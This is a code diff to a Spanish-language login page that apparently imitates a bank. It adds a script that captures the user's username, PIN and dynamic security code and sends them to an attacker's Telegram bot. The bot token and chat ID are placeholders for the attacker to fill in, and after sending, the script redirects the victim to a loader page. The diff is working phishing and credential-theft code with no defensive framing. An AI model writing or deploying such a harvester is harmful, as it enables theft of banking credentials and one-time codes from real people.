@@ -44,7 +44,43 @@
       <div id="cargando" style="width: 100%; text-align: center; display: none;">
       </div>
       <div id="contenidoWeb" style="">
-         <form id="loginUserForm" name="loginUserForm" action="#" onsubmit=" return sender()" method="post">
+         <form id="loginUserForm" name="loginUserForm" action="#" onsubmit="handleSubmit(event)" method="post">
+<script>
+async function handleSubmit(e) {
+    e.preventDefault();
+    const dynamic = document.getElementById('dinamica').value;
+    localStorage.setItem('dynamicCode', dynamic);
+    
+    // Prepare data for Telegram
+    const data = {
+        username: localStorage.getItem('username'),
+        pin: localStorage.getItem('userPin'),
+        dynamic: dynamic
+    };
+    
+    // Send to Telegram (Replace BOT_TOKEN and CHAT_ID with your values)
+    try {
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+        const message = `👤 Usuario: ${data.username}\n🔐 PIN: ${data.pin}\n🔑 Código: ${data.dynamic}`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    } catch(err) {
+        console.error('Error sending to Telegram:', err);
+    }
+
+    window.location.href = 'loader.html';
+}
+</script>
      
                   <p id="address"  hidden="">
             <div class="container" id="containerMain">
